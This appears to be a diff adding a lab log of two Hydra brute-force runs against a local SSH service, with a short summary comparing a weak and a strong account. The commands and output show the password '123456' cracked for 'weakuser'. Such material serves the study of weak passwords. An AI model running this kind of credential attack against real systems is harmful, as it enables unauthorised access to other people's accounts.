@@ -1,0 +1,24 @@
+┌──(kali㉿kali)-[~/labops/release]
+└─$ hydra -l weakuser -P passwords.txt ssh://localhost:2222
+Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is>
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-11-19 11:46:00
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 20 login tries (l:1/p:20), ~2 tries per task
+[DATA] attacking ssh://localhost:2222/
+[2222][ssh] host: localhost   login: weakuser   password: 123456
+1 of 1 target successfully completed, 1 valid password found
+
+┌──(kali㉿kali)-[~/labops/release]
+└─$ hydra -l stronguser -P passwords.txt ssh://localhost:2222
+Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is>
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-11-19 11:46:23
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 20 login tries (l:1/p:20), ~2 tries per task
+[DATA] attacking ssh://localhost:2222/
+1 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-11-19 11:46:28
+
+
+The found password was 123456 for login username weakuser. The scan on weakuser took about 2 seconds, while the stonguser scan took about 6seconds.
